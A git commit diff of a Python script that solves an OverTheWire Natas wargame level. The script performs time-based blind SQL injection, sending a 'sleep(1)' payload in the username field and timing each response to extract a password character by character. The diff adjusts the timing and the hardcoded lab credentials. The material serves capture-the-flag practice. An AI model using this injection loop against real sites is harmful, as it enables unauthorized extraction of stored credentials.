7e187e12d8dd2c0e20ad6f1256b28f06b697f452
D3@D53C71 <30556333+harshbakori@users.noreply.github.com>
2020-05-31 14:36:32 +0530

    changer timing

--- natas18.py
+++ natas18.py
@@ -4,26 +4,26 @@ import string
 from time import *
 characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
 
-username ='natas17'
-password ='8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
+username ='natas18'
+password ='xvz4nRzxqAjr6kfpXccka7fsZafnHbaw'
 
 url = 'http://%s.natas.labs.overthewire.org/' %username
 
 session = requests.Session()
-seenpass = list() # xvKIqDjy4OPv7wCRgDlmj0pFsDjhdP
+seenpass = list()
 while(len(seenpass)<32):
     for ch in characters:
         start_time = time()
         # print("start time is ",start_time)
         print("trying character =","".join(seenpass)+ch)
-        responce = requests.post(url,data = {"username":'natas18" AND BINARY password LIKE "'+"".join(seenpass)+ch+'%" AND sleep(2) #'},auth = (username,password))
+        responce = requests.post(url,data = {"username":'natas18" AND BINARY password LIKE "'+"".join(seenpass)+ch+'%" AND sleep(1) #'},auth = (username,password))
         
         content = responce.text 
         end_time = time()
         diff = end_time-start_time
-        # print("start time = ",start_time,"endtime is ",end_time,"difference is ",diff)
+        print("start time = ",start_time,"endtime is ",end_time,"difference is ",diff)
         returned = ()
-        if diff>2.3:
+        if diff>1.2826:
             print("got the character")
             seenpass.append(ch)
             break
